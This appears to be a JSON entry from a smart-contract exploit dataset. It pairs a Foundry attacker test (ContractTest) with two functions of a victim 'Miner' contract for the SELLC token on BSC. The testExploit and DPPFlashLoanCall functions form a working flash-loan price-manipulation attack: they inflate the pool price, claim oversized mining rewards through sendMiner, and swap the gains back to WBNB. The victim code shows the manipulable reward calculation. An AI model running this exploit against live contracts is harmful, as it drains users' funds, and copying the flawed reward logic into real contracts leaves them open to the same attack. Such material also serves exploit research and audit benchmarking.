[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "DPPFlashLoanCall",
    "original_code": "    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        address[] memory path = new address[](2);\n        path[0] = address(WBNB);\n        path[1] = address(SELLC);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            200 * 1e18, 0, path, address(this), block.timestamp\n        );\n        path[0] = address(SELLC);\n        path[1] = address(USDT);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            SELLC.balanceOf(address(this)) * 1 / 100, 0, path, address(this), block.timestamp\n        );\n        Router.addLiquidity(\n            address(SELLC),\n            address(USDT),\n            SELLC.balanceOf(address(this)),\n            USDT.balanceOf(address(this)),\n            0,\n            0,\n            address(this),\n            block.timestamp\n        ); // add SELLC-USDT Liquidity\n        path[0] = address(WBNB);\n        path[1] = address(SELLC);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            400 * 1e18, 0, path, address(this), block.timestamp\n        );\n        miner.sendMiner(address(SELLC));\n        Router.removeLiquidity(\n            address(SELLC), address(USDT), SELLC_USDT.balanceOf(address(this)), 0, 0, address(this), block.timestamp\n        ); // remove SELLC-USDT Liquidity\n        path[0] = address(SELLC);\n        path[1] = address(WBNB);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            SELLC.balanceOf(address(this)), 0, path, address(this), block.timestamp\n        );\n        WBNB.transfer(address(oracle), 600 * 1e18);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 29_005_754);\n        cheats.label(address(WBNB), \"WBNB\");\n        cheats.label(address(USDT), \"USDT\");\n        cheats.label(address(SELLC), \"SELLC\");\n        cheats.label(address(SELLC_USDT), \"SELLC_USDT\");\n        cheats.label(address(Router), \"Router\");\n        WBNB.approve(address(Router), type(uint256).max);\n        USDT.approve(address(Router), type(uint256).max);\n        SELLC.approve(address(Router), type(uint256).max);\n        SELLC_USDT.approve(address(Router), type(uint256).max);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        miner.setBNB{value: 0.01 ether}(address(SELLC), address(USDT));\n        cheats.warp(block.timestamp + 1 * 86_400 + 1);\n        oracle.flashLoan(600 * 1e18, 0, address(this), new bytes(1));\n        emit log_named_decimal_uint(\n            \"[End] Attacker WBNB balance after exploit\", WBNB.balanceOf(address(this)), WBNB.decimals()\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Miner",
    "source_type": "victim_contract",
    "function_name": "sendMiner",
    "original_code": "    function sendMiner(address token)public {\n        uint[] memory vid=MyminerID[_msgSender()][token];\n        address token1=selladdress[token][vid[0]].pair;\n        require(token1==_USDT || token1==_WBNB);\n        require(Value[token][_msgSender()]>0);\n        require(vid.length>0);\n        for(uint i=0;i<vid.length;i++){\n            require(selladdress[token][vid[i]].time > 0 && block.timestamp > selladdress[token][vid[i]].time+DAYSTIME);\n            require(inMiner[token][vid[i]]==_msgSender());\n            if(block.timestamp > selladdress[token][vid[i]].time+DAYSTIME && selladdress[token][vid[i]].ds < 366){\n               uint _day=(block.timestamp-selladdress[token][vid[i]].time)/DAYSTIME;\n               require(_day >=1 && _day < 366);\n               uint agk=getbnb(token,token1,selladdress[token][vid[i]].daybnb)*_day;\n               if(IERC20(token).balanceOf(_msgSender()) >=agk){\n                  IERC20(token).transfer(_msgSender(),agk); \n                  selladdress[token][vid[i]].ds+=_day;\n                  selladdress[token][vid[i]].sumAGK+=agk;\n                  selladdress[token][vid[i]].time=selladdress[token][vid[i]].time + DAYSTIME *_day;\n               }\n            }\n        }\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Miner",
    "source_type": "victim_contract",
    "function_name": "setBNB",
    "original_code": "    function setBNB(address token,address token1)payable public {\n        uint _bnb=msg.value;\n        require(_bnb > 0);\n        startID[token]++;\n        selladdress[token][startID[token]].time=block.timestamp;\n        selladdress[token][startID[token]].mybnb=_bnb;\n        selladdress[token][startID[token]].pair=token1;\n        selladdress[token][startID[token]].daybnb=_bnb/100; \n        Value[token][_msgSender()]+=_bnb;\n        inMiner[token][startID[token]]=_msgSender();\n        //selladdress[token][startID[token]].add.push(startID[token]);\n        MyminerID[_msgSender()][token].push(startID[token]);\n        uint oldCoin=IERC20(token).balanceOf(address(this));\n        _buy(token1,token,_bnb*92/100);\n        payable (admin).transfer(_bnb*3/100);\n        if(IERC20(token).balanceOf(address(this))>oldCoin){\n            uint ut=IERC20(token).balanceOf(address(this))-oldCoin;\n            IERC20(token).transfer(0x000000000000000000000000000000000000dEaD,ut*10/100);\n            uint coin=getTokenPrice(token,token1,_bnb*5/100);\n            _addL(token,token1,_bnb*5/100,coin,_msgSender());\n        }\n        if(address(this).balance > 0.1 ether){\n            payable (admin).transfer(address(this).balance);\n        }\n        IERC20(token).approve(address(_router), 2 ** 256 - 1);\n    }\n",
    "description": ""
  }
]